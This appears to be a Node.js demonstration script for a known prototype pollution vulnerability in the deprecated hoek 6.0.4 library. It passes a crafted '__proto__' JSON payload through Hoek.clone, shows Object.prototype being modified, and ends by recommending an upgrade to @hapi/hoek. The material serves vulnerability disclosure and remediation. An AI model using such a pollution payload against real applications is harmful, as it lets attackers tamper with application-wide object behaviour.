const Hoek = require('hoek');

console.log('=== Demonstrating Hoek v6.0.4 Prototype Pollution Vulnerability ===\n');

console.log('This deprecated version of Hoek (6.0.4) has a known prototype pollution vulnerability');
console.log('CVE: GHSA-c429-5p7v-vgjp\n');

const maliciousPayload = JSON.parse('{"__proto__": {"polluted": "This is dangerous!"}}');

console.log('Before cloning with malicious payload:');
console.log('Object prototype polluted property:', {}.polluted);

const cloned = Hoek.clone(maliciousPayload);

console.log('\nAfter cloning with malicious payload:');
console.log('Object prototype polluted property:', {}.polluted);

console.log('\nNew empty object also affected:');
const newObj = {};
console.log('newObj.polluted:', newObj.polluted);

console.log('\n⚠️  SECURITY WARNING:');
console.log('This vulnerability allows attackers to modify Object.prototype');
console.log('which affects all objects in the application.');
console.log('\n✅ RECOMMENDATION:');
console.log('Upgrade to @hapi/hoek (latest version) to fix this vulnerability.');
console.log('Run: npm uninstall hoek && npm install @hapi/hoek');